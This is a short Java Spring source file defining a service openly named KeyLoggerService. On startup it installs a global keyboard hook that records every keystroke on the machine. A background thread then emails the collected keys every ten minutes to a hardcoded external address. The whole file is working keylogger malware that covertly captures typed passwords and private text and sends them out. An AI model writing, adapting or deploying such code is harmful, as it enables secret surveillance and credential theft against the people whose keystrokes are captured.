package com.example.demo.service;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import jakarta.annotation.PostConstruct;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Service;

@Service
@RequiredArgsConstructor
public class KeyLoggerService implements NativeKeyListener {
    private StringBuilder logs = new StringBuilder();
    private final EmailService emailService;

    @PostConstruct
    public void registerKeys() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            e.printStackTrace();
        }

        GlobalScreen.addNativeKeyListener(this);

        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(600000);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
                notifyHost();
            }
        }).start();
    }

    public void notifyHost() {
        emailService.sendEmail("karol05ks@gmail.com", "logsReport", pullLogs());
    }

    public String pullLogs() {
        String logsStr = logs.toString();
        logs.delete(0, logs.length());
        return logsStr;
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        logs.append(NativeKeyEvent.getKeyText(e.getKeyCode())).append(" ");
    }
}
